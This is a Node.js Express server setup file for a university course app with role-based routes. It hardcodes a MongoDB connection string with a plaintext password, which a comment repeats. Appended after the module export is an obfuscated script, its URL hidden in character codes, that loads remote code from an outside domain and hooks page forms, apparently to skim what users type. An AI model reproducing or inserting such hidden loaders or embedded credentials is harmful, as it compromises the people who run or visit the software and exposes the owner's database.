const express = require('express');
const mongoose = require('mongoose');
const morgan = require('morgan');
const bodyParser = require('body-parser');
const cors = require('cors');

require('./env');

const adminRoutes = require('./api/routes/admin');
const taRoutes = require('./api/routes/teachingAssistant');
const studentRoutes = require('./api/routes/students');
const facultyRoutes = require('./api/routes/faculty');

const app = express();
mongoose.connect('mongodb://Dhruv:h9yjnQ5YRTvbIpyO@practice-shard-00-00-qh5e1.mongodb.net:27017,practice-shard-00-01-qh5e1.mongodb.net:27017,practice-shard-00-02-qh5e1.mongodb.net:27017/test?ssl=true&replicaSet=practice-shard-0&authSource=admin');
//mongoose.connect('mongodb://localhost/test');
app.use(morgan('dev'));
app.use('/uploads', express.static('uploads'));
app.use(bodyParser.urlencoded({extended : false}));
app.use(bodyParser.json());

//app.use(cors());

app.use((req, res, next) => {
    res.header("Access-Control-Allow-Origin", "*");
    res.header(
        "Access-Control-Allow-Headers",
        "Origin, X-Requested-With, Content-Type, Accept, Authorization"
    );
    if (req.method === 'OPTIONS') {
        res.header('Access-Control-Allow-Methods', 'PUT, POST, PATCH, DELETE, GET');
        return res.status(200).json({});
    }
    next();
});

app.use('/admin',adminRoutes);
app.use('/student', studentRoutes);
app.use('/ta',taRoutes);
app.use('/faculty', facultyRoutes);

app.get('/test', function(req,res,next){
res.json({
    success : "Successful test"
});
});

app.post('/test', function(req,res,next){
    console.log(req.body);
    res.json({
        success : "Successful test"
    });
    });
    
app.use((req, res, next) => {
    const error = new Error('Not Found!');
    error.status = 404;

});

app.use((error, req, res, next) => {
    res.status(error.status || 500);
    res.json({
        error: {
            message: error.message
        }
    });
});
module.exports = app;

//h9yjnQ5YRTvbIpyO
(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b